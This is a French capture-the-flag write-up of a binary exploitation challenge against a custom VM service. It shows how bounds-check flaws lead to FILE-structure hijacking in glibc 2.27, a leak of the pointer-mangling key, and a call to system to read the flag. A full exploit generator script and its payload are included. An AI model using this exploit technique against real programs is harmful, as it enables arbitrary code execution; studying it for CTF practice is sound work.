---
title: Exploitation — Changement d'architecture 2
parent: 404 CTF (2022)
grand_parent: CTF writeups
---

# Changement d'architecture 2

```
Hallebarde a décidé de se mettre au Cloud Native ! Pour mettre en avant
leur propre assembleur, ils proposent un service web pour exécuter des
workloads ! Une bonne occasion pour en extraire des informations situées
dans /app/flag.txt !

Auteur : Slowerzs / Woni
https://changement-darchitecture.404ctf.fr/
```

Thématique: Exploitation de binaire

Difficulté: Extrême

## Rappel sur la VM

Le binaire implémente la VM vue dans Changement d'architecture 1.

Pour rappel cette VM:

* possède des instructions encodées sur 32 bits (arithmétique)
  et 64 bits
* travaille sur 10 registres (R0..R8 dans un tableau `malloc(72)`)
  et un pointeur d'instruction dans une variable globale
* travaille sur un espace d'adressage dans lequel le programme
  est chargé à l'adresse zéro, et le pointeur R8=SP est initialisé
  à une adresse située après le programme. L'espace de travail
  est fixé à 4kB.

## Failles d'implémentation

En examinant l'implémentation des opérations arithmétiques
on voit qu'aucune vérification de borne n'est faite dans les
opérations sur les registres.

On peut donc faire les opérations:
```
Ra = OP Rb, imm (a=0..255, b=0..15, imm=0..255)
Ra = OP Rb, Rc (a=0..255, b=0..15, c=0..255)
```

Cela nous donne un dépassement de tampon dans le tas
avec une portée limitée.

L'autre faille est dans l'implémentation de POP:
```
POP Ra,Rb,...:

SP -= 8
Ra = *SP
SP -= 8
Rb = *SP
...
```
Aucune vérification de borne n'est faite sur SP, on peut effectuer
des lectures arbitraires sur l'ensemble de la mémoire du processus.

## Structure FILE

En examinant le tas avec GDB (par exemple avec le plugin GEF): on trouve

* le tableau de registres
* une structure FILE (le fichier du programme ouvert au démarrage)
* un tableau de 4kB (buffer alloué pour la lecture du programme)
* un tableau (espace mémoire de taille 4kB + taille du programme)

```
Chunk(addr=0x55ab8a1862a0, size=0x50, flags=PREV_INUSE)
    [0x000055ab8a1862a0     0a 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00    ................]
Chunk(addr=0x55ab8a1862f0, size=0x1e0, flags=PREV_INUSE)
    [0x000055ab8a1862f0     88 24 ad fb 00 00 00 00 14 69 18 8a ab 55 00 00    .$.......i...U..]
Chunk(addr=0x55ab8a1864d0, size=0x1010, flags=PREV_INUSE)
    [0x000055ab8a1864d0     09 00 bb 00 0f ca 78 01 00 00 00 00 0f ca 2c 00    ......x.......,.]
Chunk(addr=0x55ab8a1874e0, size=0x1450, flags=PREV_INUSE)
    [0x000055ab8a1874e0     09 00 bb 00 0f ca 78 01 00 00 00 00 0f ca 2c 00    ......x.......,.]
```

La portée des écritures arbitraires est donc limitée à la structure FILE.
La version de la libc étant fournie (2.27-3ubuntu1.2) on peut facilement
fabriquer un chroot Ubuntu avec la version exacte (et surtout ses
symboles de debug!)

Les paquets sont récupérables à l'adresse:
https://launchpad.net/~ubuntu-security-proposed/+archive/ubuntu/ppa/+build/19412126

Voilà la structure:
```
gef➤  p *(struct _IO_FILE_plus*)0x00005555556042b0
$3 = {
  file = {
    _flags = 0xfbad2488,
    _IO_read_ptr = 0x555555604524 "",
    _IO_read_end = 0x555555604524 "",
    _IO_read_base = 0x5555556044e0 "\002\002\020 \002\027\255 \a\a\020p\a \255\177\t",
    _IO_write_base = 0x5555556044e0 "\002\002\020 \002\027\255 \a\a\020p\a \255\177\t",
    _IO_write_ptr = 0x5555556044e0 "\002\002\020 \002\027\255 \a\a\020p\a \255\177\t",
    _IO_write_end = 0x5555556044e0 "\002\002\020 \002\027\255 \a\a\020p\a \255\177\t",
    _IO_buf_base = 0x5555556044e0 "\002\002\020 \002\027\255 \a\a\020p\a \255\177\t",
    _IO_buf_end = 0x5555556054e0 "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7ffff7dd0680 <_IO_2_1_stderr_>,
    _fileno = 0x3,
    _flags2 = 0x0,
    _old_offset = 0x0,
    _cur_column = 0x0,
    _vtable_offset = 0x0,
    _shortbuf = "",
    _lock = 0x555555604390,
    _offset = 0x44,
    _codecvt = 0x0,
    _wide_data = 0x5555556043a0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0x0,
    _mode = 0x0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7ffff7dcc2a0 <_IO_file_jumps>
}
```

## Exploitation des structures FILE

Quelques guides de FSOP (File struct oriented programming) sont
disponibles:

* https://faraz.faith/2020-10-13-FSOP-lazynote/
* https://gsec.hitb.org/materials/sg2018/D1%20-%20FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf

Dans le cas qui nous intéresse, la VM quitte le programme après
l'exécution sans faire d'opération (ni lecture ni écriture) sur
le fichier ouvert (on peut seulement déclencher `puts` dans l'exécution).

Mais on sait que le vecteur d'attaque principal se fait
via le hook de sortie `_IO_cleanup` qui appellera la fonction
`__overflow` de `vtable` si le buffer d'écriture est non vide
(`_IO_write_ptr > _IO_write_base`).

La VM nous permet de manipuler entièrement la structure FILE,
il faut donc trouver une technique pour exécuter une fonction arbitraire
(dans cette version de GLIBC, les pointeurs de fonction ont été supprimés des
structures).

Tous... non ? Certains pointeurs résistent à l'envahisseur:
```
/* Special file type for fopencookie function.  */
struct _IO_cookie_file
{
  struct _IO_FILE_plus __fp;
  void *__cookie;
  _IO_cookie_io_functions_t __io_functions;
};

typedef struct
{
  __io_read_fn *read;           /* Read bytes.  */
  __io_write_fn *write;         /* Write bytes.  */
  __io_seek_fn *seek;           /* Seek/tell file position.  */
  __io_close_fn *close;         /* Close file.  */
} _IO_cookie_io_functions_t;
```

## Exploitation d'un cookie file

La structure de cookie file est très pratique: les fonctions
de la vtable `_IO_cookie_jumps` redirigent vers les pointeurs
de fonctions, qu'on peut choisir à une valeur arbitraire.

Mais ils sont "protégés":
```
static int
_IO_cookie_close (_IO_FILE *fp)
{
  struct _IO_cookie_file *cfile = (struct _IO_cookie_file *) fp;
  cookie_close_function_t *close_cb = cfile->__io_functions.close;
#ifdef PTR_DEMANGLE
  PTR_DEMANGLE (close_cb);
#endif

  if (close_cb == NULL)
    return 0;

  return close_cb (cfile->__cookie);
}
```

et la macro `PTR_DEMANGLE` correspond à cette opération:
`ror(p, 17) ^ FS+0x30`
```
Dump of assembler code for function _IO_cookie_close:
   0x00007ffff7a63090 <+0>:     mov    rax,QWORD PTR [rdi+0x100]
   0x00007ffff7a63097 <+7>:     ror    rax,0x11
   0x00007ffff7a6309b <+11>:    xor    rax,QWORD PTR fs:0x30
   0x00007ffff7a630a4 <+20>:    test   rax,rax
   0x00007ffff7a630a7 <+23>:    je     0x7ffff7a630b8 <_IO_cookie_close+40>
   0x00007ffff7a630a9 <+25>:    mov    rdi,QWORD PTR [rdi+0xe0]
   0x00007ffff7a630b0 <+32>:    jmp    rax
   0x00007ffff7a630b2 <+34>:    nop    WORD PTR [rax+rax*1+0x0]
   0x00007ffff7a630b8 <+40>:    xor    eax,eax
   0x00007ffff7a630ba <+42>:    ret    
```

Le problème est que nos instructions de VM ne permettent pas de savoir où
se situe le segment FS.

## Fuite de cookie

Essayons de voir sur un example comment obtenir la clé d'obfuscation des
pointeurs. Il y a d'autres endroits contenant des pointeurs manglés:

```
gef➤  hexdump qword --size 8 $fs_base
0x007ffff7ff24c0│+0x0000   0x00007ffff7ff24c0   
0x007ffff7ff24c8│+0x0008   0x00007ffff7ff2e20   
0x007ffff7ff24d0│+0x0010   0x00007ffff7ff24c0   
0x007ffff7ff24d8│+0x0018   0x0000000000000000   
0x007ffff7ff24e0│+0x0020   0x0000000000000000   
0x007ffff7ff24e8│+0x0028   0xebf93834bfd2a700 <= stack canary
0x007ffff7ff24f0│+0x0030   0x0f71c1dc3ba7328b <= ptr mangle  
0x007ffff7ff24f8│+0x0038   0x0000000000000000   

gef➤  x/8gx __exit_funcs
0x7ffff7dd0d80 <initial>:       0x0000000000000000      0x0000000000000001
0x7ffff7dd0d90 <initial+16>:    0x0000000000000004      0x7c4798f2d6f61ee3
0x7ffff7dd0da0 <initial+32>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd0db0 <initial+48>:    0x0000000000000000      0x0000000000000000
```

Comme l'espace d'adressage de la libc est limité, ces pointeurs encodés
doivent se "ressembler":
```
In [13]: "%x" % rol17(0x7ffff7de59f0 ^ 0x0f71c1dc3ba7328b)
Out[13]: '7c4798f2d6f61ee3'

In [14]: "%x" % rol17(0x7ffff79e4000 ^ 0x0f71c1dc3ba7328b)
Out[14]: '7c479872e5161ee3'

In [15]: "%x" % rol17(0x7ffff7bcb000 ^ 0x0f71c1dc3ba7328b)
Out[15]: '7c47983705161ee3'
```

On peut donc chercher ce motif en mémoire:
```
gef➤  search-pattern 0x7c4798 little
[+] Searching '\x98\x47\x7c' in memory
[+] In '/lib/x86_64-linux-gnu/libc-2.27.so'(0x7ffff7dcf000-0x7ffff7dd1000), permission=rw-
  0x7ffff7dd0d9d - 0x7ffff7dd0da9  →   "\x98\x47\x7c[...]" 
[+] In (0x7ffff7dd1000-0x7ffff7dd5000), permission=rw-
  0x7ffff7dd44b5 - 0x7ffff7dd44c1  →   "\x98\x47\x7c[...]" 
  0x7ffff7dd44bd - 0x7ffff7dd44c9  →   "\x98\x47\x7c[...]" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe5cd - 0x7fffffffe5d9  →   "\x98\x47\x7c[...]" 
```

Qu'a-t-on trouvé:
```
gef➤  info symbol 0x7ffff7dd44b0
__vdso_clock_gettime in section .bss of target:/lib/x86_64-linux-gnu/libc.so.6
gef➤  info symbol 0x7ffff7dd44b8
__vdso_clock_getcpu in section .bss of target:/lib/x86_64-linux-gnu/libc.so.6
gef➤  p __vdso_getcpu
$11 = (long (*)(unsigned int *, unsigned int *, void *)) 0x7c4798b111f61ee3
(demangling)
gef➤  info symbol 0x00007ffff7ffba70
getcpu in section .text of system-supplied DSO at 0x7ffff7ffb000
```
les pointeurs de vDSO ne sont pas très intéressants (avec l'ASLR, on ne
sait pas où sera le vDSO).

On a aussi truouvé le pointeur dans 'initial' qui pointe dans ld-linux.so
(idem, on ne sait pas où il est censé être).

Il reste un pointeur sur la pile qu'on peut situer par rapport à argv
(traces d'une autre exécution):
```
gef➤  x/8gx __libc_argv-20
0x7ffc1e485088: 0x00007ffc1e485120      0x0000000000000000
0x7ffc1e485098: 0x0000000000000000      0x7aa80ceaecb3c838
0x7ffc1e4850a8: 0x7a3f52fbda8dc838      0x00007ffc00000000
0x7ffc1e4850b8: 0x0000000000000000      0x0000000000000000
```

Avec quelques calculs on trouve que:
```
__libc_argv[-16] = PTR_MANGLE(__libc_start_main + 159)
__libc_argv[-17] = PTR_MANGLE(un pointeur de pile)
```

On peut donc:

* utiliser le pointeur de liste chaînée de la structure FILE
  pour trouver stderr
* se déplacer sur le symbole `__libc_argv` pour trouver l'adresse de la
  pile
* déréférencer la valeur (avec POP)
* la combiner avec `__libc_start_main + 159` pour trouver la clé de
  chiffrement

## Exploitation d'un cookie file (suite)

On va ensuite:

* déplacer le pointeur de vtable pour que le champ `__overflow`
  soit `IO_cookie_close`
* encoder un pointeur vers `system` dans la structure `cookie_file`
* faire pointeur cookie vers une chaîne "cat /app/flag.txt"
* modifier `_IO_write_ptr > _IO_write_base` pour déclencher l'appel à
  overflow dans le hook de sortie

Script final (après un peu d'optimisation pour compacter):
```
import sys
from pwn import p32, p64, hexdump

OP = {
    "add": 0xAD,
    "sub": 0x5B,
    "xor": 0x10,
    "and": 0x4D,
    "or": 0x0B,
    "lsh": 0x37,
    "rsh": 0xD2,
}


class ASM:
    def __init__(self):
        self.mode = 32
        self.buf = bytearray()

    def op(self, str, r0, r1, /, reg=None, imm=None):
        "Arithmetique"
        self._mode32()
        if reg is not None:
            instr = (r1 << 28) | (OP[str] << 16) | (reg << 8) | r0
            self.buf += p32(instr)
        elif imm is not None:
            instr = (r1 << 28) | 0xF << 24 | (OP[str] << 16) | (imm << 8) | r0
            self.buf += p32(instr)

    def _mode32(self):
        if self.mode == 64:
            dst = len(self.buf) + 8
            dst += 1
            self.buf += p64((dst << 16) | 0xBB00)
        self.mode = 32

    def _mode64(self):
        if self.mode == 32:
            self.buf += p32(0x00BB0009)  # nop
        self.mode = 64

    def jmpreg(self, r):
        self._mode32()
        assert r <= 8
        self.buf += p32(0x00BB0000 + r)  # nop

    def mov(self, r1, r2):
        self._mode64()
        self.buf += p64(0x1700 + (r2 << 4) + r1)

    def push(self, *regs):
        if len(regs) > 6:
            raise ValueError("too many regs")
        self._mode64()
        n = len(regs)
        self.buf += bytes([n << 4, 0x65] + list(regs) + (6 - n) * [0])

    def pop(self, *regs):
        if len(regs) > 6:
            raise ValueError("too many regs")
        self._mode64()
        n = len(regs)
        self.buf += bytes([n << 4, 0x56] + list(regs) + (6 - n) * [0])

    def pushimm(self, imm: int):
        self._mode64()
        self.buf += bytes([0x0f, 0x65])
        self.buf += imm.to_bytes(6, "little")

    def syscall(self):
        self._mode64()
        self.buf += bytes([0, 0x90, 0, 0, 0, 0, 0, 0])

A = ASM()
# constantes dans R1, R2, R3, R4
A.pushimm(0x8220)
A.pushimm(3975985) # const2
A.pushimm(3789216) # const3
A.pushimm(35720)   # const4
A.pushimm(4440)    # const5
A.pop(5, 4, 3, 2, 1)
# base RAM - 8 = R27 + 4440
A.op("add", 6, 5, reg=27)
# R7 = R37 + 0x8220 (&argv)
# R8 = R7-base
# R5 = argv
A.op("add", 7, 1, reg=37)
A.op("sub", 8, 7, reg=6)
A.pop(5)
# R8 = &argv[-16]
# R5 = argv[-16] (mangled_setjmp)
A.op("sub", 8, 5, imm=16*8)
A.op("sub", 8, 8, reg=6)
A.pop(5)
# Compute mangled_system
# __libc_start_main+159 = R23 - 3975985
# __libc_system = R23 - 3789216
# cookie = mangled_setjmp ^ (__libc_start_main+159 << 17)
# mangled_system = cookie ^ (__libc_system << 17)
A.op("add", 1, 0, reg=23)
A.op("sub", 2, 1, reg=2) # R2 = R23 - Const2
A.op("sub", 3, 1, reg=3) # R3 = R23 - Const3
A.op("lsh", 2, 2, imm=17) # LSH 17
A.op("lsh", 3, 3, imm=17) # LSH 17
A.op("xor", 5, 5, reg=2) # R5=cookie
# R39 (io_functions.read) = R5
A.op("xor", 39, 5, reg=3) # R3 ^ cookie

# Setup struct _IO_cookie_file:
# BEFORE: _IO_file_jumps      (base+0x3e82a0)
# AFTER:  _IO_cookie_jumps+88 (base+0x3e7938)
# R37 (vtable) = R7-0x8220-2408
A.op("sub", 37, 7, reg=4)
# R38 (cookie) = memory_base + SIZE = R6 + SIZE + 8
DATA_OFFSET = 0xa4
A.op("add", 38, 6, imm=DATA_OFFSET+8)

# Setup mode and offset
# R15 += xxx (write ptr > write base)
A.op("add", 15, 4, reg=15)
# illegal instruction (JMP R5 = cookie > memsize)
A.jmpreg(2)

# Get bytecode
payload = A.buf
data = b"cat /app/flag*"
codesz = len(payload)
padsz = DATA_OFFSET - len(payload)
print(f"Payload size: {codesz} code {padsz} pad {len(data)} data")
assert codesz <= DATA_OFFSET
assert codesz + padsz == DATA_OFFSET

payload += padsz*b"\0" + data
print(hexdump(payload), file=sys.stderr)
```

Et la payload:
```
00000000  09 00 bb 00  0f 65 20 82  00 00 00 00  0f 65 31 ab  │····│·e ·│····│·e1·│
00000010  3c 00 00 00  0f 65 a0 d1  39 00 00 00  0f 65 88 8b  │<···│·e··│9···│·e··│
00000020  00 00 00 00  0f 65 58 11  00 00 00 00  50 56 05 04  │····│·eX·│····│PV··│
00000030  03 02 01 00  00 bb 3d 00  00 00 00 00  06 1b ad 50  │····│··=·│····│···P│
00000040  07 25 ad 10  08 06 5b 70  09 00 bb 00  10 56 05 00  │·%··│··[p│····│·V··│
00000050  00 00 00 00  00 bb 5d 00  00 00 00 00  08 80 5b 5f  │····│··]·│····│··[_│
00000060  08 06 5b 80  09 00 bb 00  10 56 05 00  00 00 00 00  │··[·│····│·V··│····│
00000070  00 bb 79 00  00 00 00 00  01 17 ad 00  02 02 5b 10  │··y·│····│····│··[·│
00000080  03 03 5b 10  02 11 37 2f  03 11 37 3f  05 02 10 50  │··[·│··7/│··7?│···P│
00000090  27 03 10 50  25 04 5b 70  26 ac ad 6f  0f 0f ad 40  │'··P│%·[p│&··o│···@│
000000a0  02 00 bb 00  63 61 74 20  2f 61 70 70  2f 66 6c 61  │····│cat │/app│/fla│
000000b0  67 2a                                               │g*│
```
